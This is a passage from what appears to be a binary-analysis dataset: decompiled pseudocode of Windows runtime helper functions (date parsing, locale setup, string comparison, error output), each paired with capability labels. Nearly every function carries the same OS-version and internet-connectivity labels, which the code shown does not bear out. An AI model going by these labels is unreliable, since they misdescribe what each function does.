iVar5 = arg_8h;\n                    fcn.0040bf9c(&stack0xfffffffc);\n                    fcn.0040bd14(iVar5);\n                    break;\n                case 0x47:\n                    fcn.0040bd7c(&stack0xfffffffc);\n                    fcn.0040bda8(&stack0xfffffffc);\n                    iVar5 = arg_8h;\n                    fcn.0040be20(&stack0xfffffffc);\n                    fcn.0040bd14(iVar5);\n                    break;\n                case 0x48:\n                    fcn.0040bd7c(&stack0xfffffffc);\n                    fcn.0040bde0(&stack0xfffffffc);\n                    bVar2 = false;\n                    puVar4 = var_4h;\n                    while (*puVar4 != 0) {\n                        if ((*((*puVar4 >> 3) + 0x490820) >> (*puVar4 & 7) & 1) == 0) {\n                            uVar1 = *puVar4;\n                            if (uVar1 < 0x49) {\n                                if (uVar1 == 0x48) break;\n                                if ((uVar1 == 0x22) || (uVar1 == 0x27)) {\n                                    bVar2 = bVar2 ^ 1;\n                                }\n                                else if (uVar1 == 0x41) goto code_r0x0040c42a;\n                            }\n                            else if (uVar1 == 0x61) {\ncode_r0x0040c42a:\n                                if (!bVar2) {\n                                    iVar5 = fcn.0040a9e0();\n                                    if ((iVar5 != 0) && (iVar5 = fcn.0040a9e0(),  iVar5 != 0)) {\n                                        fcn.0040a9e0();\n                                    }\n                                    break;\n                                }\n                            }\n                            else if (uVar1 == 0x68) break;\n                            puVar4 = puVar4 + 1;\n                        }\n                        else {\n                            puVar4 = fcn.0040e6e4();\n                        }\n                    }\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.0040bd30(arg_8h);\n                    break;\n                case 0x4d:\n                    fcn.0040bd7c(&stack0xfffffffc);\n                    fcn.0040bda8(&stack0xfffffffc);\n                    if (var_ch - 1U < 2) {\n                        fcn.0040bd30(arg_8h);\n                    }\n                    else if (var_ch - 1U == 2) {\n                        fcn.0040bd14(arg_8h);\n                    }\n                    else {\n                        fcn.0040bd14(arg_8h);\n                    }\n                    break;\n                case 0x4e:\n                    fcn.0040bd7c(&stack0xfffffffc);\n                    fcn.0040bde0(&stack0xfffffffc);\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.0040bd30(arg_8h);\n                    break;\n                case 0x53:\n                    fcn.0040bd7c(&stack0xfffffffc);\n                    fcn.0040bde0(&stack0xfffffffc);\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.0040bd30(arg_8h);\n                    break;\n                case 0x54:\n                    fcn.0040bd7c(&stack0xfffffffc);\n                    if (var_ch == 1) {\n                        fcn.0040c0b4(arg_8h);\n                    }\n                    else {\n                        fcn.0040c0b4(arg_8h);\n                    }\n                    break;\n                case 0x59:\n                    fcn.0040bd7c(&stack0xfffffffc);\n                    fcn.0040bda8(&stack0xfffffffc);\n                    if (var_ch < 3) {\n                        fcn.0040bd30(arg_8h);\n                    }\n                    else {\n                        fcn.0040bd30(arg_8h);\n                    }\n                    break;\n                case 0x5a:\n                    fcn.0040bd7c(&stack0xfffffffc);\n                    fcn.0040bde0(&stack0xfffffffc);\n                    if (3 < var_ch) {\n                        var_ch = 3;\n                    }\n                    fcn.0040bd30(arg_8h);\n                }\n            }\n            else {\n                iVar5 = arg_8h;\n                fcn.0040e6c4();\n                fcn.0040bcd0(iVar5);\n                var_4h = fcn.0040e6e4();\n                var_1eh._0_1_ = 0x20;\n            }\n        }\n        *(arg_8h + -0x108) = *(arg_8h + -0x108) + -1;\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x40c83f;\n    uStack68 = 0x40c837;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 2804
    },
    "0040cb28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0040cb28(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint uStack20;\n    \n    uStack20 = 0;\n    iVar5 = 7;\n    piVar3 = 0x4958d8;\n    puVar4 = 0x4958f4;\n    do {\n        if (*piVar3 == 0) break;\n        uVar1 = fcn.004058fc();\n        fcn.004058fc(uVar1);\n        iVar2 = fcn.0040e90c();\n        if (iVar2 != 0) {\n            uStack20 = *puVar4;\n            break;\n        }\n        puVar4 = puVar4 + 1;\n        piVar3 = piVar3 + 1;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    return CONCAT44(uStack20, uStack20);\n}\n",
        "token_count": 229
    },
    "0040cb7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040cb7c(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if (*0x4958cc == 0x12) {\n        if (in_EAX < 100) {\n            uVar1 = fcn.0040bcbc();\n            uVar2 = *(arg_8h + -4) >> 0x1f;\n            in_EAX = in_EAX + (((uVar1 & 0xffff) + ((*(arg_8h + -4) ^ uVar2) - uVar2)) / 100) * 100;\n        }\n        if (0 < *(arg_8h + -4)) {\n            *(arg_8h + -4) = -*(arg_8h + -4);\n        }\n    }\n    else {\n        *(arg_8h + -4) = *(arg_8h + -4) + -1;\n    }\n    return *(arg_8h + -4) + in_EAX;\n}\n",
        "token_count": 243
    },
    "0040cbd8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040cbd8(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffac;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    ushort var_18h;\n    uint var_16h;\n    ushort var_12h;\n    ushort var_10h;\n    char var_eh;\n    uchar var_dh;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    var_20h = 0;\n    var_8h = 0;\n    uStack64 = 0x40cefa;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    var_16h._0_2_ = 0;\n    var_18h = 0;\n    var_1ch._0_1_ = 0;\n    var_dh = 0;\n    var_eh = fcn.0040ca94();\n    var_4h = 0;\n    if (**0x495814 == 'g') {\n        fcn.0040cae0();\n        fcn.00405964(&fcn.0040cbd8::var_20h);\n        fcn.00409af4();\n        var_4h = fcn.0040cb28();\n    }\n    else {\n        iVar2 = fcn.0040e840();\n        if (0 < iVar2) {\n            var_4h = *0x4958f4;\n        }\n    }\n    cVar1 = fcn.0040c8ec(&fcn.0040cbd8::var_1ch + 3);\n    if ((cVar1 != '\\0') && (cVar1 = fcn.0040ca58(),  cVar1 != '\\0')) {\n        in_stack_ffffffac = 0x40ccc6;\n        cVar1 = fcn.0040c8ec(&fcn.0040cbd8::var_1ch + 2);\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.0040ca58();\n            if (cVar1 == '\\0') {\n                fcn.0040bcbc();\n                if (var_eh == '\\x01') {\n                    var_18h = var_10h;\n                    var_16h._0_2_ = var_12h;\n                }\n                else {\n                    var_16h._0_2_ = var_10h;\n                    var_18h = var_12h;\n                }\n            }\n            else {\n                in_stack_ffffffac = &fcn.0040cbd8::var_1ch + 1;\n                cVar1 = fcn.0040c8ec(in_stack_ffffffac);\n                if (cVar1 == '\\0') goto code_r0x0040ced7;\n                if (var_eh == '\\0') {\n                    var_1ch._0_1_ = var_1ch._1_1_;\n                    var_16h._0_2_ = var_10h;\n                    var_18h = var_12h;\n                }\n                else if (var_eh == '\\x01') {\n                    var_1ch._0_1_ = var_1ch._1_1_;\n                    var_16h._0_2_ = var_12h;\n                    var_18h = var_10h;\n                }\n                else if (var_eh == '\\x02') {\n                    var_1ch._0_1_ = var_1ch._3_1_;\n                    var_16h._0_2_ = var_12h;\n                    var_18h = var_16h._2_2_;\n                }\n                if (var_4h < 1) {\n                    if (var_1ch < 3) {\n                        fcn.0040bcbc();\n                    }\n                }\n                else {\n                    fcn.0040cb7c(&stack0xfffffffc);\n                }\n            }\n            fcn.0040ca58();\n            fcn.0040c8c8();\n            if ((*0x4958d4 != '\\0') && (iVar2 = fcn.00405a48(),  iVar2 != 0)) {\n                if (**0x495828 - 0x30U < 10) {\n                    fcn.0040cae0();\n                }\n                else {\n                    do {\n                        while ((iVar2 = fcn.0040572c(),  *param_2 <= iVar2 && (*(in_EAX + -1 + *param_2) != ' '))) {\n                            *param_2 = *param_2 + 1;\n                        }\n                        fcn.0040c8c8();\n                        iVar2 = fcn.0040572c();\n                        if (iVar2 < *param_2) break;\n                        fcn.0040572c();\n                        fcn.00405964();\n                        iVar2 = fcn.00409a90();\n                        if (iVar2 == 0) break;\n                        fcn.0040572c();\n                        fcn.00405964();\n                        iVar2 = fcn.00409a90();\n                    } while (iVar2 != 0);\n                }\n            }\n            var_dh = fcn.0040b97c(var_ch);\n            in_stack_ffffffac = var_ch;\n        }\n    }\ncode_r0x0040ced7:\n    *in_FS_OFFSET = in_stack_ffffffac;\n    fcn.00405490(0x40cf01);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 1305
    },
    "0040cf24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040cf24(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *in_stack_ffffffd0;\n    uint16_t in_stack_ffffffd4;\n    uchar *arg_8h;\n    uchar *arg_8h_00;\n    uint32_t uStack32;\n    ushort uStack28;\n    ushort uStack26;\n    uchar auStack24 [4];\n    uchar auStack20 [4];\n    \n    uVar2 = 0;\n    iVar3 = -1;\n    cVar1 = fcn.0040c980();\n    if ((cVar1 == '\\0') && (cVar1 = fcn.0040c980(),  cVar1 == '\\0')) {\n        cVar1 = fcn.0040c980();\n        if ((cVar1 != '\\0') || (cVar1 = fcn.0040c980(),  cVar1 != '\\0')) {\n            iVar3 = 0xc;\n        }\n    }\n    else {\n        iVar3 = 0;\n    }\n    if (-1 < iVar3) {\n        fcn.0040c8c8();\n    }\n    cVar1 = fcn.0040c8ec(&stack0xffffffec);\n    if (cVar1 != '\\0') {\n        uStack32 = uStack32 & 0xffff;\n        uStack28 = 0;\n        uStack26 = 0;\n        arg_8h_00 = 0x40cfd6;\n        cVar1 = fcn.0040ca58();\n        if (cVar1 != '\\0') {\n            arg_8h_00 = &stack0xffffffe8;\n            cVar1 = fcn.0040c8ec(arg_8h_00);\n            if (cVar1 == '\\0') {\n                return 0;\n            }\n            in_stack_ffffffd4 = 0xd004;\n            cVar1 = fcn.0040ca58();\n            if (cVar1 != '\\0') {\n                arg_8h = &stack0xffffffe4;\n                cVar1 = fcn.0040c8ec(arg_8h);\n                in_stack_ffffffd4 = arg_8h;\n                if (cVar1 == '\\0') {\n                    return 0;\n                }\n                in_stack_ffffffd0 = 0x40d032;\n                cVar1 = fcn.0040ca58();\n                if (cVar1 != '\\0') {\n                    in_stack_ffffffd0 = &stack0xffffffe0;\n                    cVar1 = fcn.0040c8ec(in_stack_ffffffd0);\n                    if (cVar1 == '\\0') {\n                        return 0;\n                    }\n                }\n            }\n        }\n        if (iVar3 < 0) {\n            cVar1 = fcn.0040c980();\n            if ((cVar1 == '\\0') && (cVar1 = fcn.0040c980(),  cVar1 == '\\0')) {\n                cVar1 = fcn.0040c980();\n                if ((cVar1 != '\\0') || (cVar1 = fcn.0040c980(),  cVar1 != '\\0')) {\n                    iVar3 = 0xc;\n                }\n            }\n            else {\n                iVar3 = 0;\n            }\n        }\n        if ((iVar3 < 0) || ((in_stack_ffffffd4 != 0 && (in_stack_ffffffd4 < 0xd)))) {\n            fcn.0040c8c8();\n            uVar2 = fcn.0040b834(in_stack_ffffffd0, arg_8h_00 >> 0x10);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 824
    },
    "0040d320": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d320(int32_t *arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    fcn.0040d2a8(arg_8h);\n    if (*arg_8h == 0) {\n        fcn.004075f4();\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "0040d480": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d480(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 1;\n    while( true ) {\n        if (*(iVar1 * 4 + 0x4958d4) == 0) {\n            fcn.00405664();\n            return 1;\n        }\n        if (iVar1 == 7) break;\n        iVar1 = iVar1 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 105
    },
    "0040d9a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040d9a8(void)\n\n{\n    uint uVar1;\n    uint uStack1128;\n    uchar *puStack1124;\n    uchar *puStack1120;\n    uint uStack1116;\n    uchar *puStack1112;\n    uint uStack1108;\n    uchar *puStack1104;\n    uchar *puStack1100;\n    uchar auStack1092 [48];\n    uchar auStack1044 [8];\n    uchar auStack1036 [8];\n    uchar auStack1028 [1028];\n    \n    puStack1100 = 0x40d9bc;\n    fcn.0040d820(0x400);\n    if (**0x4929b0 == '\\0') {\n        puStack1100 = 0x40;\n        puStack1104 = &stack0xfffffbbc;\n        uStack1108 = *(*0x4926a4 + 4);\n        puStack1112 = 0x40da3e;\n        puStack1112 = fcn.00406afc();\n        uStack1116 = 0x40da44;\n        sub.user32.dll_LoadStringA_1();\n        uStack1116 = 0x2010;\n        puStack1120 = &stack0xfffffbac;\n        puStack1124 = &stack0xfffffbec;\n        uStack1128 = 0;\n        sub.user32.dll_MessageBoxA_1();\n    }\n    else {\n        puStack1100 = 0x40d9d0;\n        fcn.00403814();\n        puStack1100 = 0x40d9d5;\n        fcn.0040304c();\n        puStack1100 = &stack0xfffffbfc;\n        puStack1104 = &stack0xfffffbfc;\n        puStack1112 = &stack0xfffffbb0;\n        uStack1108 = 0x40d9e4;\n        sub.user32.dll_CharToOemA();\n        uStack1108 = 0;\n        uStack1116 = 0x40d9f4;\n        uStack1116 = fcn.0040a84c();\n        puStack1120 = &stack0xfffffbf4;\n        puStack1124 = 0xfffffff4;\n        uStack1128 = 0x40da01;\n        uStack1128 = sub.kernel32.dll_GetStdHandle_1();\n        sub.kernel32.dll_WriteFile_1();\n        uVar1 = sub.kernel32.dll_GetStdHandle_1(0xfffffff4, 0x40da6c, 2, &stack0xfffffb98, 0);\n        sub.kernel32.dll_WriteFile_1(uVar1);\n    }\n    return;\n}\n",
        "token_count": 592
    },
    "0040dec8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040dec8(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *puVar4;\n    uint uStack392;\n    uint uStack388;\n    uchar *puStack384;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint lpFilename;\n    uint lpBuffer;\n    uint hModule;\n    int32_t var_10h;\n    uint var_4h;\n    \n    puStack384 = &stack0xfffffffc;\n    var_14ch = 0;\n    var_154h = 0;\n    var_150h = 0;\n    var_4h = 0;\n    uStack388 = 0x40e083;\n    uStack392 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack392;\n    iVar1 = *(arg_8h + -4);\n    if (*(iVar1 + 0x14) == 0) {\n        puStack384 = &stack0xfffffffc;\n        fcn.004075f4();\n    }\n    else {\n        fcn.004075f4();\n    }\n    uVar2 = *(iVar1 + 0x18);\n    sub.kernel32.dll_VirtualQuery_1(*(iVar1 + 0xc), &lpBuffer, 0x1c);\n    if (var_10h == 0x1000) {\n        iVar3 = sub.kernel32.dll_GetModuleFileNameA_1(hModule, &lpFilename, 0x105);\n        if (iVar3 != 0) {\n            var_148h = *(iVar1 + 0xc);\n            var_144h._0_1_ = 5;\n            fcn.004056dc();\n            fcn.0040a604();\n            var_140h = var_14ch;\n            var_13ch._0_1_ = 0xb;\n            var_138h = var_4h;\n            var_134h._0_1_ = 0xb;\n            var_12ch._0_1_ = 5;\n            puVar4 = &var_148h;\n            arg_8h_00 = 3;\n            var_130h = uVar2;\n            fcn.004075f4();\n            fcn.0040daac(arg_8h_00, puVar4);\n            goto code_r0x0040e052;\n        }\n    }\n    var_16ch = *(iVar1 + 0xc);\n    var_168h._0_1_ = 5;\n    var_164h = var_4h;\n    var_160h._0_1_ = 0xb;\n    var_158h._0_1_ = 5;\n    puVar4 = &var_16ch;\n    arg_8h_00 = 2;\n    var_15ch = uVar2;\n    fcn.004075f4();\n    fcn.0040daac(arg_8h_00, puVar4);\ncode_r0x0040e052:\n    *in_FS_OFFSET = arg_8h_00;\n    fcn.0040546c(0x40e08a);\n    fcn.00405490();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 861
    },
    "0040e1f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040e1f0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*0x49591c != NULL) {\n        *(*0x49591c + 3) = 1;\n        (**(**0x49591c + -8))();\n        *0x49591c = NULL;\n    }\n    if (*0x495920 != 0) {\n        *(*0x495920 + 0xc) = 1;\n        fcn.00404640();\n        *0x495920 = 0;\n    }\n    **0x492614 = 0;\n    **0x49274c = 0;\n    **0x49268c = 0;\n    **0x492728 = 0;\n    **0x492758 = 0;\n    **0x492904 = 0;\n    iVar1 = fcn.00402f74();\n    if (iVar1 != 0) {\n        uVar2 = fcn.00402f94();\n        fcn.00402f74(uVar2);\n        fcn.0040e15c();\n    }\n    return;\n}\n",
        "token_count": 252
    },
    "0040e404": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040e404(uint param_1, int32_t param_2)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    uVar2 = 0;\n    if ((in_EAX != NULL) && (in_EAX[param_2] != 0)) {\n        if (param_2 == 0) {\n            if ((*((*in_EAX >> 3) + 0x490820) >> (*in_EAX & 7) & 1) != 0) {\n                uVar2 = 1;\n            }\n        }\n        else {\n            iVar3 = param_2 + -1;\n            while ((-1 < iVar3 && ((*((in_EAX[iVar3] >> 3) + 0x490820) >> (in_EAX[iVar3] & 7) & 1) != 0))) {\n                iVar3 = iVar3 + -1;\n            }\n            uVar1 = param_2 - iVar3 & 0x80000001;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n            }\n            if (uVar1 == 0) {\n                uVar2 = 2;\n            }\n            else if ((*((in_EAX[param_2] >> 3) + 0x490820) >> (in_EAX[param_2] & 7) & 1) != 0) {\n                uVar2 = 1;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 361
    },
    "0040e478": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040e478(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    if (*0x4958d4 != '\\0') {\n        fcn.004058fc();\n        uVar1 = fcn.0040e404();\n    }\n    return uVar1;\n}\n",
        "token_count": 71
    },
    "0040e49c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040e49c(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    if (*0x4958d4 != '\\0') {\n        uVar1 = fcn.0040e404();\n    }\n    return uVar1;\n}\n",
        "token_count": 64
    },
    "0040e6c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0040e6c4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*0x4958d4 != '\\0') {\n        iVar1 = sub.user32.dll_CharNextA_1();\n        return iVar1 - in_EAX;\n    }\n    return 1;\n}\n",
        "token_count": 77
    },
    "0040e6ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040e6ec(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = 1;\n    if ((*0x4958d4 != '\\0') && (uVar2 = *(in_EAX + -1 + param_2),  (*((uVar2 >> 3) + 0x490820) >> (uVar2 & 7) & 1) != 0)\n       ) {\n        fcn.004058fc();\n        uVar1 = fcn.0040e6c4();\n    }\n    return uVar1;\n}\n",
        "token_count": 155
    },
    "0040e724": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040e724(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = param_2 + 1;\n    if ((*0x4958d4 != '\\0') && (uVar2 = *(in_EAX + -1 + param_2),  (*((uVar2 >> 3) + 0x490820) >> (uVar2 & 7) & 1) != 0)\n       ) {\n        fcn.004058fc();\n        iVar1 = fcn.0040e6c4();\n        iVar1 = iVar1 + param_2;\n    }\n    return iVar1;\n}\n",
        "token_count": 169
    },
    "0040e90c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040e90c(uint param_1, char *param_2)\n\n{\n    uint8_t uVar1;\n    char *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack24;\n    uint32_t uStack20;\n    \n    iVar4 = 0;\n    if ((((in_EAX != NULL) && (*in_EAX != '\\0')) && (param_2 != NULL)) && (*param_2 != '\\0')) {\n        iStack24 = fcn.0040a84c();\n        uVar2 = fcn.0040a84c();\n        iVar4 = fcn.0040aa38();\n        while ((iVar4 != 0 && (uVar2 <= iStack24 - (iVar4 - in_EAX)))) {\n            uVar1 = fcn.0040e49c();\n            uStack20 = uStack20 & 0xffffff00 | uVar1;\n            if (uVar1 != 2) {\n                iStack24 = 0x400;\n                iVar3 = sub.kernel32.dll_CompareStringA_1();\n                if (iVar3 == 2) goto code_r0x0040e9a2;\n            }\n            iVar4 = fcn.0040aa38();\n        }\n        iVar4 = 0;\n    }\ncode_r0x0040e9a2:\n    return CONCAT44(uStack20, iVar4);\n}\n",
        "token_count": 325
    },
    "0040eb40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.0040eb40(void)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint *in_FS_OFFSET;\n    uint *var_40h;\n    uint *var_3ch;\n    uint *var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint *var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = &stack0xfffffffc;\n    iVar1 = 8;\n    do {\n        var_4h = 0;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    var_14h = 0x40ee0b;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0040eb40::var_18h;\n    var_1ch = 0x40eb63;\n    var_ch = unaff_EBX;\n    fcn.0040ea7c();\n    var_1ch = 0x40eb68;\n    fcn.0040d35c();\n    if (*0x4958d4 != '\\0') {\n        var_1ch = 0x40eb76;\n        fcn.0040d534();\n    }\n    var_1ch = 0x40eb7b;\n    sub.kernel32.dll_GetThreadLocale_1();\n    var_1ch = &fcn.0040eb40::var_10h;\n    var_20h = 0x40eb8f;\n    fcn.0040d2a8(var_1ch);\n    var_20h = 0x40eb9c;\n    fcn.004054c0();\n    var_20h = &fcn.0040eb40::var_14h;\n    var_24h = 0x40ebb1;\n    fcn.0040d2a8(var_20h);\n    var_24h = 0x40ebbb;\n    *0x49580c = fcn.00409e90();\n    var_24h = &fcn.0040eb40::var_18h;\n    var_28h = 0x40ebd5;\n    fcn.0040d2a8(var_24h);\n    var_28h = 0x40ebdf;\n    *0x49580d = fcn.00409e90();\n    var_28h = 0x40ebf2;\n    *0x49580e = fcn.0040d2f4();\n    var_28h = 0x40ec05;\n    *0x49580f = fcn.0040d2f4();\n    var_28h = &fcn.0040eb40::var_1ch;\n    var_2ch = 0x40ec1f;\n    fcn.0040d2a8(var_28h);\n    var_2ch = 0x40ec29;\n    *0x495810 = fcn.00409e90();\n    var_2ch = 0x40ec3c;\n    *0x495811 = fcn.0040d2f4();\n    var_2ch = &fcn.0040eb40::var_24h;\n    var_30h = 0x40ec56;\n    fcn.0040d2a8(var_2ch);\n    var_30h = 0x40ec61;\n    fcn.0040d5e4();\n    var_30h = 0x40ec6e;\n    fcn.004054c0();\n    var_30h = 